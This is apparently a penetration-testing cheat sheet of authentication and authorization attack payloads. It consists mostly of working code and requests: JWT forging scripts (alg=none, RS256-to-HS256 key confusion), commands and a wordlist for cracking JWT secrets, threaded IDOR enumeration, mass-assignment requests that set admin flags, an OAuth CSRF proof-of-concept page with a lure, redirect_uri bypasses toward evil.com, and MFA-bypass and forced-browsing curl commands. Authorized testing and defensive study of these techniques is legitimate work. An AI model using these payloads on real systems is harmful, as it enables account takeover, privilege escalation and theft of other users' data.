# Auth & Authorization Attack Payloads

## JWT Manipulation Payloads

### Algorithm None Attack

**Step 1: Decode the original token**
```bash
# Decode without verification
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0Iiwicm9sZSI6InVzZXIifQ.SIG" | \
  python3 -c "
import sys, base64, json
token = sys.stdin.read().strip()
parts = token.split('.')
header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
print('Header:', json.dumps(header, indent=2))
print('Payload:', json.dumps(payload, indent=2))
"
```

**Step 2: Craft unsigned token with none algorithm**
```python
import base64, json

def b64url_encode(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

# Modified header — set alg to none
header = {"alg": "none", "typ": "JWT"}
# Modified payload — escalate role
payload = {"sub": "1234", "role": "admin", "is_admin": True}

header_enc = b64url_encode(json.dumps(header, separators=(',', ':')))
payload_enc = b64url_encode(json.dumps(payload, separators=(',', ':')))

# No signature (empty)
token = f"{header_enc}.{payload_enc}."
print(f"Forged token: {token}")

# Try variations:
# alg: "none", "None", "NONE", "nOnE"
for alg_variant in ["none", "None", "NONE", "nOnE"]:
    header = {"alg": alg_variant, "typ": "JWT"}
    header_enc = b64url_encode(json.dumps(header, separators=(',', ':')))
    print(f"{alg_variant}: {header_enc}.{payload_enc}.")
```

### RS256 to HS256 Confusion Attack

```python
import jwt, base64, requests

# Step 1: Obtain server's public key
# - Try /.well-known/jwks.json
# - Try /api/public-key
# - Extract from SSL certificate
response = requests.get("https://target.com/.well-known/jwks.json")
jwks = response.json()

# Convert JWK to PEM
from cryptography.hazmat.primitives.asymmetric import rsa
from jwt.algorithms import RSAAlgorithm
import json

public_key = RSAAlgorithm.from_jwk(json.dumps(jwks['keys'][0]))
public_key_pem = public_key.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)

# Step 2: Sign a malicious payload using public key as HMAC secret
malicious_payload = {
    "sub": "admin",
    "role": "admin",
    "is_admin": True,
    "exp": 9999999999
}

# Sign with HS256 using public key bytes as secret
forged_token = jwt.encode(malicious_payload, public_key_pem, algorithm="HS256")
print(f"Forged token: {forged_token}")

# Step 3: Test the forged token
headers = {"Authorization": f"Bearer {forged_token}"}
r = requests.get("https://target.com/api/admin/users", headers=headers)
print(r.status_code, r.text[:200])
```

### JWT Secret Brute-Force

```bash
# hashcat — fastest
hashcat -m 16500 captured_jwt.txt /usr/share/wordlists/rockyou.txt
hashcat -m 16500 captured_jwt.txt common_jwt_secrets.txt --rules-file /usr/share/hashcat/rules/best64.rule

# Common JWT secrets wordlist
cat > common_jwt_secrets.txt << 'EOF'
secret
password
123456
jwt_secret
mysecret
app_secret
session_secret
your-secret-key
change_me
changeme
development
production
test
admin
pass
key
token
jwt
private
shhh
supersecret
s3cr3t
p@ssw0rd
SecretKey
MySecretKey
JWTSecret
API_SECRET
APP_KEY
SECRET_KEY
flask-secret
django-secret
rails-secret
EOF

# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256 jwt_hash.txt

# jwt_tool
python3 jwt_tool.py eyJhbGciOiJIUzI1NiJ9... -C -d /usr/share/wordlists/rockyou.txt
```

**Once cracked — forge any payload:**
```python
import jwt

SECRET = "secret"  # Cracked secret
payload = {"sub": "1", "username": "admin", "role": "admin", "exp": 9999999999}
forged = jwt.encode(payload, SECRET, algorithm="HS256")
print(forged)
```

---

## IDOR Probing Strategies

### Sequential Integer ID Enumeration

```python
import requests, threading

def probe_resource(base_url, resource_id, session_cookie, results):
    url = f"{base_url}/{resource_id}"
    r = requests.get(url, cookies={"session": session_cookie})
    if r.status_code == 200:
        results.append((resource_id, r.json()))
        print(f"[+] Found resource {resource_id}: {r.text[:100]}")

session_cookie = "your_session_here"
base_url = "https://target.com/api/invoices"

results = []
threads = []
for i in range(1, 10000):
    t = threading.Thread(target=probe_resource, args=(base_url, i, session_cookie, results))
    threads.append(t)
    t.start()
    if len(threads) >= 50:  # 50 concurrent threads
        for t in threads:
            t.join()
        threads = []

print(f"Found {len(results)} accessible resources")
```

### UUID Enumeration (v4 — random, but still try)

```bash
# Try UUIDs from other resources that might be predictable
# e.g., profile picture URLs often expose UUIDs: /uploads/USER_UUID/profile.jpg
# Try that UUID in: GET /api/users/USER_UUID/

# Use ffuf for UUID enumeration from a wordlist
ffuf -u "https://target.com/api/documents/FUZZ" \
  -w known_user_uuids.txt \
  -H "Cookie: session=YOUR_SESSION" \
  -fc 404
```

### Parameter Pollution / Type Confusion

```bash
# Try arrays instead of scalars
GET /api/orders?id[]=1&id[]=1337
GET /api/orders?id=1,1337

# Try as different types
GET /api/orders?id=1337
GET /api/orders?id=1337.0
GET /api/orders?id=1.337e3
```

### Hidden IDOR via Indirect References

```bash
# Export/download endpoints often lack ownership check
GET /api/export?user_id=1337&format=csv
GET /api/reports/download/1337.pdf
GET /api/audit-log?account_id=1337

# Notification/activity endpoints
GET /api/notifications?user_id=1337
GET /api/activity?actor_id=1337

# File references in S3/CDN
GET /files/1337/invoice.pdf
GET /uploads/user-1337/document.pdf
```

### HTTP Method Override for IDOR

```bash
# Some apps check auth for GET but not POST/PATCH
curl -X POST "https://target.com/api/admin/users/1337" \
  -H "Cookie: session=low_privilege_session" \
  -H "Content-Type: application/json" \
  -d '{"action": "get"}'

# Method override headers
curl -X POST "https://target.com/api/documents/1337" \
  -H "X-HTTP-Method-Override: DELETE" \
  -H "Cookie: session=low_priv"
```

---

## Mass Assignment Escalation Payloads

### Role/Admin Flag Injection

**Django REST Framework — set is_staff:**
```http
PATCH /api/users/me/ HTTP/1.1
Content-Type: application/json
Cookie: session=attacker_session

{"username": "attacker", "email": "a@b.com", "is_staff": true, "is_superuser": true}
```

**Rails — inject admin flag:**
```http
PUT /users/profile HTTP/1.1
Content-Type: application/json

{"user": {"name": "Attacker", "email": "a@b.com", "admin": true, "role": "superadmin"}}
```

**Node.js/MongoDB — inject role field:**
```http
PUT /api/users/me HTTP/1.1
Content-Type: application/json

{"name": "Attacker", "role": "admin", "permissions": ["read", "write", "admin"]}
```

**Laravel — bypass guarded fields via JSON:**
```http
POST /api/register HTTP/1.1
Content-Type: application/json

{"name": "Attacker", "email": "a@b.com", "password": "pass", "is_admin": 1, "role_id": 1}
```

### Nested Mass Assignment

```http
POST /api/users/register HTTP/1.1
Content-Type: application/json

{
  "username": "attacker",
  "password": "pass",
  "profile": {
    "name": "Attacker"
  },
  "account": {
    "subscription": "enterprise",
    "credits": 999999
  }
}
```

### Second-Order Mass Assignment

```bash
# Step 1: Update profile with nested org_id (appears harmless)
PATCH /api/users/me
{"name": "Attacker", "org_id": 1337}  # Org ID of target organization

# Step 2: Subsequent requests now operate in context of org 1337
GET /api/org/documents  # Returns documents from org 1337!
```

---

## OAuth Attack Payloads

### CSRF on OAuth (Missing State)

```bash
# Step 1: Initiate OAuth flow as attacker, capture authorization URL
# https://auth.provider.com/oauth?client_id=X&redirect_uri=https://app.com/callback&state=ATTACKER_STATE&response_type=code

# Step 2: Approve the flow as attacker, obtain the callback URL
# https://app.com/callback?code=AUTH_CODE&state=ATTACKER_STATE

# Step 3: Send victim to that callback URL (before code expires, typically 60s)
# If app doesn't validate state, victim's session gets bound to attacker's account
```

**CSRF PoC HTML:**
```html
<html>
<body>
<img src="https://app.com/oauth/callback?code=ATTACKER_CODE&state=ATTACKER_STATE" width=1 height=1>
<p>Click here for a free prize!</p>
</body>
</html>
```

### Open Redirect in redirect_uri

```bash
# Test if redirect_uri validation can be bypassed
https://auth.provider.com/oauth?
  client_id=REAL_CLIENT_ID&
  redirect_uri=https://legit-app.com/callback?next=https://evil.com&  # Open redirect
  response_type=code&scope=openid

# Or via path traversal:
redirect_uri=https://legit-app.com/../../evil.com/callback

# Or subdomain bypass:
redirect_uri=https://evil.legit-app.com/callback
redirect_uri=https://legit-app.com.evil.com/callback
```

### Account Takeover via OAuth Misbinding

```bash
# Scenario: App links OAuth account to existing account by matching email
# Provider allows unverified emails

# Step 1: Register on provider with victim's email (unverified)
# Step 2: OAuth login → app creates new account or links to victim's account
# because email matches, without verifying the email is confirmed on provider side
```

---

## Privilege Escalation via Role Parameters

### Vertical Escalation — Admin Endpoint Discovery

```bash
# Common admin paths to test with low-privilege session
curl -s https://target.com/admin/ -H "Cookie: session=user_session" -o /dev/null -w "%{http_code}"
curl -s https://target.com/api/admin/users -H "Cookie: session=user_session" -o /dev/null -w "%{http_code}"
curl -s https://target.com/api/v1/admin/ -H "Cookie: session=user_session" -o /dev/null -w "%{http_code}"
curl -s https://target.com/management/ -H "Cookie: session=user_session" -o /dev/null -w "%{http_code}"

# Try with different methods
curl -X DELETE "https://target.com/api/users/1" -H "Cookie: session=user_session"
curl -X PUT "https://target.com/api/config/setting" -H "Cookie: session=user_session" -d '{"value": "x"}'
```

### Response Manipulation (MFA Bypass)

```bash
# Step 1: Send valid credentials, get MFA challenge
# Step 2: Intercept response and modify:

# Change: {"status": "mfa_required", "next": "/mfa"}
# To:     {"status": "success", "next": "/dashboard", "token": "..."}

# Or intercept the MFA submission response:
# Change: HTTP 403 to HTTP 200
# Change: {"success": false} to {"success": true}
```

### Step-Skip (Forced Browsing)

```bash
# Multi-step flow: /login → /mfa → /dashboard
# Try accessing /dashboard directly after /login (before /mfa)
curl "https://target.com/dashboard" -H "Cookie: session=SESSION_AFTER_PASSWORD_ONLY"
```
